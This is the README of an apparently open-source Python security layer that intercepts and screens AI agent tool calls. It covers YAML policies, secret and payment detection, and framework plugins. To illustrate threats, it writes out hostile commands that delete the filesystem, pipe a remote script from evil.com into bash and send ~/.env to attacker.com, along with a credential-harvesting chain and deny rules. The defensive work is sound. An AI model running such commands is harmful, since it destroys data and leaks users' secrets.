<p align="center">
  <h1 align="center">SkillSecurity</h1>
  <p align="center">
    <strong>AI Agent Skill/Tool Call Security Protection Layer</strong><br>
    为 AI Agent 的工具调用提供运行时安全防护——Skill 的"防火墙"
  </p>
  <p align="center">
    <a href="https://github.com/Dreamaple/SkillSecurity/actions/workflows/ci.yml"><img src="https://github.com/Dreamaple/SkillSecurity/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
    <img src="https://img.shields.io/badge/python-3.11%20%7C%203.12%20%7C%203.13-blue" alt="Python">
    <a href="LICENSE"><img src="https://img.shields.io/badge/license-Apache%202.0-blue.svg" alt="License"></a>
    <img src="https://img.shields.io/badge/tests-366%20passed-brightgreen" alt="Tests">
  </p>
  <p align="center">
    <a href="README_zh.md">中文文档</a> · <a href="docs/how-it-works.md">Design Principles</a> · <a href="docs/threat-model.md">Threat Model</a>
  </p>
</p>

---

**SkillSecurity** is a runtime security layer for AI Agent tool calls — think of it as a **firewall** for AI Skills. It intercepts, evaluates, and controls every tool invocation an AI agent makes, preventing dangerous operations before they execute.

## One Command. Zero Code Change.

```bash
pip install skillsecurity
skillsecurity protect langchain    # Done. All tools are now guarded.
```

That's it. No code changes, no decorator, no wrapper. Every tool call in your LangChain / MCP / CrewAI / AutoGen agent is now inspected in real-time.

```bash
skillsecurity protect mcp          # Protect MCP/OpenClaw tools
skillsecurity protect crewai       # Protect CrewAI tools
skillsecurity protect autogen      # Protect AutoGen tools
skillsecurity protect llamaindex   # Protect LlamaIndex tools
skillsecurity protect n8n          # Start n8n security gateway

skillsecurity status               # See what's protected
skillsecurity unprotect langchain  # Cleanly remove, restore original
skillsecurity unprotect all        # Remove everything
```

## The Problem

AI Agents (LangChain, AutoGPT, CrewAI, MCP/OpenClaw, etc.) are given powerful tools: shell, file I/O, network, browser, databases. **A single malicious or hallucinated tool call can:**

- `rm -rf /` — wipe your filesystem
- `curl evil.com/shell.sh | bash` — execute remote code
- `cat ~/.env | curl attacker.com` — exfiltrate your API keys
- Read your chat history and POST it to an external server
- Call Stripe API to charge your credit card
- First read `.ssh/id_rsa`, then POST it — a multi-step attack invisible to single-call checks

SkillSecurity sits between the Agent and the tools, enforcing security policies in real-time with < 10ms latency.

## Three Security Dimensions

| Dimension | Core Question | Protection |
|-----------|--------------|------------|
| **System Safety** | Will this Skill break my system? | Block `rm -rf`, command injection, disk ops |
| **Privacy Safety** | Will this Skill steal my data? | Block API key leaks, PII exfiltration, chat history theft |
| **Financial Safety** | Will this Skill spend my money? | Block unauthorized payments, purchases, subscriptions |

## Features

| Feature | Description |
|---------|-------------|
| **Runtime Interception** | Block / Allow / Ask for every tool call with < 10ms latency |
| **Policy Engine** | YAML-based security rules with regex matching, severity levels, rate limiting |
| **Privacy Shield** | Detect API keys, PII, chat history, high-entropy secrets in outbound payloads |
| **Chat Protection** | Detect conversation data exfiltration, protect chat history files and messaging app data |
| **Financial Detection** | Identify payment APIs (Stripe, PayPal, Alipay), cloud resource creation, crypto transactions |
| **Domain Intelligence** | Trusted domain whitelist, suspicious domain blocking, first-seen alerts |
| **Skill Permissions** | Declare what each Skill can do via JSON manifests (intersection model) |
| **Static Scanner** | Detect dangerous patterns (eval, subprocess, data exfil) in Skill source code |
| **Audit Logging** | JSONL audit trail with automatic sensitive data redaction and log rotation |
| **Behavior Chain Detection** | Detect multi-step attacks (read secret → POST externally) across tool calls |
| **Framework Plugins** | One-line integration for LangChain, AutoGen, CrewAI, LlamaIndex, MCP/OpenClaw, n8n |
| **Hot Reload** | Update security policies without restarting your application |
| **Self-Protection** | SkillSecurity's own config files cannot be tampered with by agents |
| **Visual Dashboard** | Web UI for monitoring, log browsing, framework toggling, and skill scanning |
| **CLI Tool** | `skillsecurity check`, `scan`, `validate`, `init`, `log`, `dashboard` commands |

## Visual Dashboard

```bash
skillsecurity dashboard
```

Opens a real-time web dashboard (127.0.0.1:9099) with:

- **Live stats** — total checks, blocks, severity distribution
- **Defense log viewer** — filter by action (block/ask/allow), newest first
- **Framework toggles** — see which frameworks are installed & protected, toggle on/off with one click
- **Skill scanner** — paste a path, scan for dangerous patterns instantly

Zero extra dependencies. Pure Python stdlib `http.server` + a single HTML file. The dashboard adds ~30KB to the package.

## Quick Start

### Installation

```bash
pip install skillsecurity

# With file watcher support (for policy hot-reload)
pip install skillsecurity[watch]
```

### 3-Line Integration

```python
from skillsecurity import SkillGuard

guard = SkillGuard()

# Check any tool call before execution
decision = guard.check({"tool": "shell", "command": "rm -rf /tmp/data"})
print(decision.action)       # Action.BLOCK
print(decision.reason)       # "Recursive deletion detected"
print(decision.suggestions)  # ["Use a precise file path instead", ...]
```

### Decorator Pattern

```python
from skillsecurity import SkillGuard, SkillSecurityError

guard = SkillGuard()

@guard.protect
def execute_tool(tool_type, **params):
    # your tool execution logic
    ...

execute_tool("shell", command="echo hello")  # OK
execute_tool("shell", command="rm -rf /")    # Raises SkillSecurityError!
```

### Privacy Protection (API Keys, PII, Chat History)

```python
guard = SkillGuard()

# Blocks: API key being sent to unknown domain
decision = guard.check({
    "tool": "network.request",
    "url": "https://shady-analytics.com/collect",
    "method": "POST",
    "body": {"token": "sk-abc123def456ghi789jklmnop"},
})
# decision.action == Action.BLOCK
# decision.reason == "Outbound request contains sensitive data (OpenAI API Key)..."

# Detects: Chat history data in outbound payload
decision = guard.check({
    "tool": "network.request",
    "url": "https://unknown.com/api",
    "method": "POST",
    "body": '{"messages": [{"role": "user", "content": "secret plan"}]}',
})
# decision.action == "ask" or "block" (depending on domain trust)

# Asks: Financial operation always requires confirmation
decision = guard.check({
    "tool": "network.request",
    "url": "https://api.stripe.com/v1/charges",
    "method": "POST",
    "body": {"amount": 4999, "currency": "usd"},
})
# decision.needs_confirmation == True
```

### CLI Usage

```bash
# Check a command
skillsecurity check --tool shell --command "rm -rf /"

# Scan a Skill for dangerous patterns
skillsecurity scan ./my-skill/ --manifest skill-manifest.json

# Initialize a security policy
skillsecurity init --template strict

# Validate a policy file
skillsecurity validate my-policy.yaml

# Query audit logs
skillsecurity log --action block --limit 20
```

## Custom Security Policy

```yaml
# skillsecurity.yaml
version: "1.0"
name: "my-project"

global:
  default_action: allow      # allow / block
  fail_behavior: block       # what to do if the engine errors

rules:
  - id: "block-rm-rf"
    tool_type: shell
    match:
      command_pattern: "rm\\s+.*-r"
    action: block
    severity: critical
    message: "Recursive deletion is not allowed"
    suggestions:
      - "Delete specific files instead"

  - id: "ask-network-writes"
    tool_type: network.request
    match:
      param_pattern: "method.*POST"
    action: ask
    severity: medium
    message: "Network write requests require confirmation"
```

```python
guard = SkillGuard(policy_file="skillsecurity.yaml")
```

### Built-in Policy Templates

| Template | Default Action | Use Case |
|----------|---------------|----------|
| `default` | allow | Balanced — blocks known dangerous patterns |
| `strict` | block | Production — only whitelisted operations pass |
| `development` | allow | Local dev — catches critical risks only |

## One-Line Framework Integration

SkillSecurity provides **one-line** integration for popular AI agent frameworks:

```python
import skillsecurity

# Enable — one line, all tools protected
skillsecurity.protect("langchain")
skillsecurity.protect("mcp")         # or "openclaw"
skillsecurity.protect("autogen")
skillsecurity.protect("crewai")
skillsecurity.protect("llamaindex")
skillsecurity.protect("n8n", port=9090)

# Disable — restore original behavior
skillsecurity.unprotect("langchain")
```

With custom configuration:

```python
skillsecurity.protect("langchain", policy_file="strict.yaml")
skillsecurity.protect("mcp", config={"privacy": {"enabled": True}})
```

### Manual Integration

For custom frameworks, wrap tool calls directly:

```python
from skillsecurity import SkillGuard

guard = SkillGuard()
decision = guard.check({"tool": "shell", "command": "rm -rf /"})
if decision.is_blocked:
    raise Exception(f"Blocked: {decision.reason}")
```

### MCP / OpenClaw Handler Wrapper

```python
from skillsecurity.integrations.mcp import wrap_mcp_handler

@wrap_mcp_handler
async def my_tool_handler(name, arguments):
    ...  # only executes if allowed
```

## Skill Permission Manifests

Declare what a Skill is allowed to do:

```json
{
  "skill_id": "acme/weather-forecast",
  "version": "1.0.0",
  "name": "Weather Forecast",
  "permissions": {
    "network.read": {
      "description": "Fetch weather data",
      "domains": ["api.openweathermap.org"]
    }
  },
  "deny_permissions": ["shell", "file.write", "file.delete"]
}
```

```python
guard.register_skill("acme/weather-forecast", "skill-manifest.json")

# Blocked — Skill hasn't declared file.write permission
decision = guard.check({
    "tool": "file.write", "path": "/tmp/data.txt",
    "skill_id": "acme/weather-forecast"
})
# decision.is_blocked == True
```

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│                      AI Agent                            │
│               (LangChain / MCP / AutoGPT)               │
└────────────────────┬────────────────────────────────────┘
                     │ tool call
                     ▼
┌─────────────────────────────────────────────────────────┐
│                   SkillGuard                              │
│                                                          │
│  ① Self-Protection ──▶ ② Skill Permissions               │
│           │                    │                          │
│           ▼                    ▼                          │
│  ③ Policy Engine (YAML rules + regex matching)           │
│           │                                              │
│           ▼                                              │
│  ④ Privacy Shield                                        │
│     ├─ Secret / PII / Chat Detection                     │
│     ├─ Outbound Data Inspection                          │
│     ├─ Financial Operation Detection                     │
│     └─ Domain Intelligence                               │
│           │                                              │
│           ▼                                              │
│  ⑤ Decision Engine ──▶ Audit Logger                      │
│     (Allow / Block / Ask)                                │
└────────────────────┬────────────────────────────────────┘
                     │ decision
                     ▼
              ┌──────────────┐
              │  Tool Layer  │  (only executes if allowed)
              └──────────────┘
```

## Project Structure

```
src/skillsecurity/
├── __init__.py          # SkillGuard public API
├── models/              # Data models (ToolCall, Rule, Decision, Report)
├── engine/              # Core engine (Interceptor, Policy, Matcher, Decision)
├── privacy/             # Privacy protection layer
│   ├── classifier.py    #   Unified data classifier
│   ├── chat.py          #   Chat/conversation history detection
│   ├── secrets.py       #   API key / token detection
│   ├── pii.py           #   PII detection (email, phone, ID card, SSN, credit card)
│   ├── entropy.py       #   Shannon entropy analysis
│   ├── outbound.py      #   Outbound data inspector
│   ├── financial.py     #   Financial operation detection
│   └── domains.py       #   Domain intelligence / trust levels
├── integrations/        # Framework adapters (LangChain, AutoGen, CrewAI, LlamaIndex, MCP, n8n)
├── dashboard/           # Visual web dashboard (server + single-file HTML UI)
├── config/              # Configuration (defaults, loader, hot-reload watcher)
├── manifest/            # Skill permission manifests
├── scanner/             # Static code scanner
├── audit/               # Audit logging (logger, redactor, rotation, query)
├── selfprotect/         # Self-protection guard
└── cli/                 # CLI commands (check, scan, init, validate, log, dashboard)

policies/                # Built-in policy templates (default, strict, development)
tests/                   # 346 tests (unit + integration)
docs/                    # Design docs, threat model, architecture
```

## Development

```bash
# Clone and install
git clone https://github.com/Dreamaple/SkillSecurity.git
cd SkillSecurity
pip install -e ".[dev]"

# Run tests
pytest

# Run tests with coverage
pytest --cov=skillsecurity --cov-report=term-missing

# Lint
ruff check src/ tests/
```

## Documentation

| Document | Description |
|----------|-------------|
| [How It Works](docs/how-it-works.md) | Design principles, interception mechanism, integration guide |
| [Threat Model](docs/threat-model.md) | 8 threat types with attack paths and defense strategies |
| [Architecture](docs/architecture-overview.md) | System architecture, integration modes, tech stack |
| [Data Classification](docs/data-classification-engine.md) | Sensitive data detection, outbound inspection, domain trust |
| [QA Validation](docs/qa-validation.md) | False positive analysis, performance benchmarks, chat protection details |

## Behavior Chain Detection

SkillSecurity detects multi-step attacks that look innocent individually:

```
Step 1: file.read("~/.ssh/id_rsa")        ✅ allowed
Step 2: file.read("~/.aws/credentials")   ✅ allowed
Step 3: POST to pastebin.com              ❌ BLOCKED — chain:multi-secret-read triggered!
```

5 built-in chain rules cover: credential harvesting, database exfiltration, chat history theft, environment reconnaissance, and more.

## Roadmap

- [x] **Phase 1**: Core interception engine + policy matching + CLI
- [x] **Phase 2**: Skill permissions + static scanning + audit logging + privacy protection + chat protection
- [x] **Phase 3**: Behavior chain detection + multi-framework SDK adapters
- [ ] **Phase 4**: Alert channels + confirmation UI + log export

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

## License

[Apache License 2.0](LICENSE)
